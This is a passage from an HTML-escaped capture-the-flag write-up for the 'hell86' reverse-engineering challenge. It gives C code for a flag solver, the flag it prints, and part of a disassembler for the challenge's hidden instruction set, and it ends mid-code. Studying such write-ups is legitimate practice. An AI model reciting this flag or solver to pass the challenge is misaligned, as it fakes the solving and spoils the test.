    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now the function at 0x51 is called with the array of indices. It applies a transformation on the array of indices and compares the modified array with the array of bytes at &lt;strong&gt;0x1fa0&lt;/strong&gt;. If they are equal we get to return 0 (success).&lt;br&gt;
&lt;strong&gt;0x66&lt;/strong&gt; works like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;modify&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt;* words, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; count)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (--count &amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;) {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; temp = words[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]-words[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;] ^ count;
            *words++ = temp*temp*temp;
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To find the flag, we have the modified array at &lt;strong&gt;0x1fa0&lt;/strong&gt;, the starting index as &lt;strong&gt;0x16&lt;/strong&gt;. Here&amp;rsquo;s the code&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;solve&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* elf)
    {
        int64_t* delta = (int64_t*) (elf+&lt;span style=&#34;color:#3677a9&#34;&gt;0x1fa0&lt;/span&gt;);
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;-=-=-=- FLAG{&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; set[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0x16&lt;/span&gt;, count = &lt;span style=&#34;color:#3677a9&#34;&gt;0x1e&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (count--) {
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;, set[i]);
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; m = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;) round(cbrt(*delta++));
            i += m^count;
        }
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;} -=-=-=-&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;()
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; fd = open(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;hell86&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (fd == -&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) {
            fprintf(stderr, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;open failed !&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            exit(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        }

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; stat stbuf = {&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;};
        fstat(fd, &amp;amp;stbuf);

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* buffer = mmap(&lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, stbuf.st_size, PROT_READ, MAP_PRIVATE, fd, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (! buffer) {
            close(fd);
            fprintf(stderr, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mmap failed !&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            exit(&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;);
        }

        solve(buffer);

        munmap(buffer, stbuf.st_size);
        close(fd);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which outputs&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-=-=-=- FLAG{x86-1s-s0-fund4m3nt4lly-br0k3n} -=-=-=-
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here&amp;rsquo;s the complete code (including the disassembler)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;elf.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* regs[] = {
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r8&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r9&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r10&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r11&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r12&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r13&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r14&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;r15&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rdi&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rsi&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rbp&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rbx&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rdx&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rax&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rcx&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rsp&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rip&amp;#34;&lt;/span&gt;
    };

    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#pragma pack(push, 1)
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; instr_t
    {
        uint16_t ud2;
        uint64_t imm;
        uint8_t instr;
        uint8_t dest;
        uint8_t src1;
        uint8_t src2;
    };
    &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#pragma pack(pop)
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// printf(fmt_strings[i], imm, dest, src1, src2)
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* fmt_strings[] = {
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;nop&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;add %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;sub %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mul %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;div.quot %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;div.rem %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;sar %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;shl %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;neg %2$s, %3$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov %2$s, %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movzx %2$s, byte [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movsx %2$s, byte [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movzx %2$s, word [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movsx %2$s, word [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov %2$s, dword [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movsxd %2$s, dword [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov %2$s, qword [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov byte [%3$s + %1$#x], %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov word [%3$s + %1$#x], %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov dword [%3$s + %1$#x], %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov qword [%3$s + %1$#x], %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;push %3$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;push %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;pop %2$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mov %2$s, %3$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;or %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;and %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;xor %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;not %2$s, %3$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.lt %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.le %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.gt %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.ge %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.eq %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.neq %2$s, %3$s, %4$s&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.eq %2$s, %3$s, %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.neq %2$s, %3$s, %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;cmp.z %2$s, %3$s       ; %2$s = %3$s == 0&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;if.z %3$s, jmp %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;if.nz %3$s, jmp %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;call %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;ret&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;ret.nz %3$s        ; return if %3$s is not zero&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;ret.z %3$s         ; return if %3$s is zero&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;lea %2$s, [%3$s + %1$#x]&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;sar %2$s, %3$s, %1$#hx&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;shl %2$s, %3$s, %1$#hx&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;or %2$s, %3$s, %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;and %2$s, %3$s, %1$#x&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;xor %2$s, %3$s, %1$#x&amp;#34;&lt;/span&gt;
    };

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* &lt;span style=&#34;color:#447fcf&#34;&gt;resolve&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* elf, uint64_t addr)
    {
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// resolve address
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        Elf64_Ehdr* header = (Elf64_Ehdr*) elf;
        Elf64_Shdr* section = (Elf64_Shdr*) (elf + header-&amp;gt;e_shoff);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; n_sections = header-&amp;gt;e_shnum;
        Elf64_Shdr *strtab = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, *symtab = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, *rela = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; n_sections; ++i) {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!strtab &amp;amp;&amp;amp; section-&amp;gt;sh_type == SHT_STRTAB &amp;amp;&amp;amp; section-&amp;gt;sh_offset != header-&amp;gt;e_shstrndx)
                strtab = section;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!symtab &amp;amp;&amp;amp; (section-&amp;gt;sh_type == SHT_SYMTAB || section-&amp;gt;sh_type == SHT_DYNSYM))
                symtab = section;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!rela &amp;amp;&amp;amp; section-&amp;gt;sh_type == SHT_RELA)
                rela = section;
            section++;
        }
        Elf64_Sym* sym = (Elf64_Sym*) (elf+symtab-&amp;gt;sh_offset);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* names = elf+strtab-&amp;gt;sh_offset;
        Elf64_Rela* reloc = (Elf64_Rela*) (elf+rela-&amp;gt;sh_offset);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; n_relocs = rela-&amp;gt;sh_size / &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(Elf64_Rela);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; n_relocs; ++i) {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (reloc-&amp;gt;r_offset == addr) {
                &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// addr has an entry in reloc
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; sym_idx = reloc-&amp;gt;r_info &amp;gt;&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;32&lt;/span&gt;;
                Elf64_Sym* symb = sym+sym_idx;;
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; names+symb-&amp;gt;st_name;
            }
            reloc++;
        }
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;;
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;solve&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* elf)
    {
        int64_t* delta = (int64_t*) (elf+&lt;span style=&#34;color:#3677a9&#34;&gt;0x1fa0&lt;/span&gt;);
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;-=-=-=- FLAG{&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; set[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0x16&lt;/span&gt;, count = &lt;span style=&#34;color:#3677a9&#34;&gt;0x1e&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (count--) {
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;, set[i]);
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; m = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;) round(cbrt(*delta++));
            i += m^count;
        }
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;} -=-=-=-&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;()
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; fd = open(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;hell86&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (fd == -&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) {
            fprintf(stderr, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;open failed !&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            exit(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        }

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; stat stbuf = {&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;};
        fstat(fd, &amp;amp;stbuf);

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* buffer = mmap(&lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, stbuf.st_size, PROT_READ, MAP_PRIVATE, fd, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (! buffer) {
            close(fd);
            fprintf(stderr, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;mmap failed !&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
            exit(&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;);
        }

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* start = buffer+&lt;span style=&#34;color:#3677a9&#34;&gt;0x1190&lt;/span&gt;;
        uint32_t eip = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (start &amp;lt; buffer+&lt;span style=&#34;color:#3677a9&#34;&gt;0x1946&lt;/span&gt;) {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; instr_t* i = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; instr_t*) start;
            printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%08x%10s&amp;#34;&lt;/span&gt;, eip, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
            eip++;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i-&amp;gt;instr == &lt;span style=&#34;color:#3677a9&#34;&gt;40&lt;/span&gt; &amp;amp;&amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt; == i-&amp;gt;imm)
